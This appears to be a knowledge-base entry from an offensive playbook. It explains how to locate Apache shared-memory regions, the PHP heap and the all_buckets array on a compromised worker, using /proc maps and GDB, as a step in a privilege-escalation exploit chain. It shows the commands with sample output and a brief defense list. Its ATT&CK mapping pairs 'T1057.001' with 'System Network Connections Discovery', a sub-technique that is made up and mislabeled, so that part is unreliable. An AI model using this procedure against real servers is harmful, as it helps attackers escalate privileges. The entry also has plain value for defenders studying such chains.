---
id: proc-locate-apache-shm
tags:
  - apache
  - shared-memory
  - gdb
type: procedure
tools:
  - '[[tools/GDB]]'
  - '[[tools/proc-filesystem]]'
tactics:
  - '[[Discovery]]'
commands:
  - '[[commands/cat-proc-maps-grep-libphp-rw-p]]'
  - '[[commands/cat-proc-maps-grep-rw-s]]'
  - '[[commands/gdb-print-ap-scoreboard-image]]'
  - '[[commands/gdb-print-all-buckets]]'
verified: false
platforms:
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Process Discovery]]'
updated_at: '2025-12-14T17:30:47.281Z'
skill_level: advanced
impact_level: medium
detection_risk: low
sub_techniques:
  - '[[T1057.001]]'
validated: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[Process Discovery]]'
---
# Locate Apache Shared Memory and Bucket Structures

## Summary

This procedure uses process memory maps and GDB debugging to identify Apache's shared memory (SHM) regions, heap addresses, and the all_buckets array by scanning for known structure patterns like mutex->meth in libapr.

## Description

From a compromised Apache worker (PID e.g., 6318), query /proc/<pid>/maps for rw-p regions in libphp and rw-s for SHM. Attach GDB to inspect ap_scoreboard_image and scan for prefork_child_bucket patterns (e.g., mutex pointing to APR functions) to find all_buckets base address. This enables precise targeting for SHM manipulation in the privilege escalation chain.

## Requirements

1. Access to /proc/<pid> for target worker PID
2. GDB installed and attachable to process
3. Running Apache with mod_prefork

## Defense

Defensive measures and detection strategies:

- Restrict /proc access via containerization or AppArmor
- Disable GDB attachment with ptrace restrictions
- Log anomalous process inspections

## Objectives

1. Map heap and SHM addresses
2. Locate all_buckets for OOB targeting
3. Identify bucket indexes via process_score

## Instructions

### Step 1: Query Memory Maps for Heap and SHM

**Context**: Find PHP heap (rw-p in libphp) and SHM (rw-s) addresses.

**Command** ([[commands/cat-proc-maps-grep-libphp-rw-p]]):
```bash
cat /proc/6318/maps | grep libphp | grep rw-p
```

> Outputs: 7f4a8f9f3000-7f4a8fa0a000 rw-p 00471000 08:02 542265 /usr/lib/apache2/modules/libphp7.2.so

**Command** ([[commands/cat-proc-maps-grep-rw-s]]):
```bash
cat /proc/6318/maps | grep rw-s
```

> Outputs: 7f4a9323e000-7f4a93252000 rw-s 00000000 00:05 57052 /dev/zero (deleted)

### Step 2: Inspect Structures in GDB

**Context**: Attach GDB and print key structures to locate all_buckets.

**Command** ([[commands/gdb-print-ap-scoreboard-image]]):
```bash
(gdb) p *ap_scoreboard_image
```

> Outputs: { global = 0x7f4a9323e008, parent = 0x7f4a9323e020, servers = 0x55835eddea78 }

**Command** ([[commands/gdb-print-all-buckets]]):
```bash
(gdb) p all_buckets
```

> Outputs: (prefork_child_bucket *) 0x7f4a9336b3f0; scan for patterns like mutex->meth.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]] Discovery

### Techniques

- [[Process Discovery]] Process Discovery

### Sub-Techniques

- [[T1057.001]] Process Discovery: System Network Connections Discovery

## Commands Used

- [[commands/cat-proc-maps-grep-libphp-rw-p]]
- [[commands/cat-proc-maps-grep-rw-s]]
- [[commands/gdb-print-ap-scoreboard-image]]
- [[commands/gdb-print-all-buckets]]

## Tools Used

- [[tools/GDB]]
- [[tools/proc-filesystem]]

## Tags

- apache
- shm
- memory-mapping
